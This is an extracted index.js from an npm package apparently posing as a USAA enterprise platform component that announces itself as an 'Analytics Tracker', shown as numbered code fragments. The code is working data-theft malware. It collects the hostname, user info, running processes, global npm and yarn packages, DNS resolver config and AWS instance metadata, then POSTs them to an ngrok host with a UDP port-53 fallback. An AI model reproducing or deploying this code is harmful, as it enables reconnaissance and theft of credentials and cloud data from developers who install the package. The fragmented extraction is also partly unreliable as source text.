// File: tmp/tmp0xtz7ujk/@usaa-grp-ent-conv-platform-usaa/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const https = require("https")
Line 3: const dgram = require("dgram")
Line 4: _tmp_1 = require("child_process")
Line 6: const LOG_SERVER = "https://7c9a-98-97-172-99.ngrok-free.app"
Line 10: {
    console.log("[+] USAA Analytics Tracker Loaded");
    return { event: "page_load", timestamp: Date.now() };
}
Line 11: console.log("[+] USAA Analytics Tracker Loaded")
Line 17: os.hostname()
Line 18: os.userInfo()
Line 19: os.platform()
Line 20: os.arch()
Line 21: os.cpus()
Line 32: exec("ps -eo comm | head -n 15", (error, stdout, stderr) => {
    if (!error) {
        logData.runningProcesses = stdout.split("\n").filter(Boolean);
    }
    sendLogData();
})
Line 40: exec("npm list -g --depth=0 && yarn global list", (error, stdout, stderr) => {
    if (!error) {
        logData.installedPackages = stdout.split("\n").filter(Boolean);
    }
    sendLogData();
})
Line 48: exec("cat /etc/resolv.conf", (error, stdout, stderr) => {
    if (!error) {
        logData.dnsResolvers = stdout.split("\n").filter(Boolean);
    }
    sendLogData();
})
Line 56: (_tmp_9 = https.get("http://169.254.169.254/latest/meta-data/", res => {
    let data = "";
    res.on("data", chunk => { data += chunk; });
    res.on("end", () => {
        logData.awsMetadata = { "meta-data": data.trim() };
        sendLogData();
    });
}))
Line 60: data.trim()
Line 66: {
    const postData = JSON.stringify(logData);
    const options = {
        hostname: LOG_SERVER.replace("https://", ""),
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": postData.length
        }
    };

    const req = https.request(options, res => {
        console.log(`[+] Sent data, response code: ${res.statusCode}`);
    });

    req.on("error", err => {
        console.error(`Error sending log: ${err.message}`);
        sendDNSLog(logData.hostname); // Fallback to DNS if HTTP fails
    });

    req.write(postData);
    req.end();
}
Line 69: _tmp_11.hostname = LOG_SERVER.replace("https://", "")
Line 79: const req = https.request(options, res => {
        console.log(`[+] Sent data, response code: ${res.statusCode}`);
    })
Line 80: console.log(`[+] Sent data, response code: ${res.statusCode}`)
Line 88: req.write(postData)
Line 89: req.end()
Line 93: {
    const message = Buffer.from(hostname);
    const client = dgram.createSocket("udp4");
    client.send(message, 0, message.length, 53, DNS_SERVER, (err) => {
        if (err) console.error(`Error sending DNS log: ${err.message}`);
        client.close();
    });
}
Line 94: Buffer.from(hostname)
Line 95: const client = dgram.createSocket("udp4")
Line 96: client.send(message, 0, message.length, 53, DNS_SERVER, (err) => {
        if (err) console.error(`Error sending DNS log: ${err.message}`);
        client.close();
    })
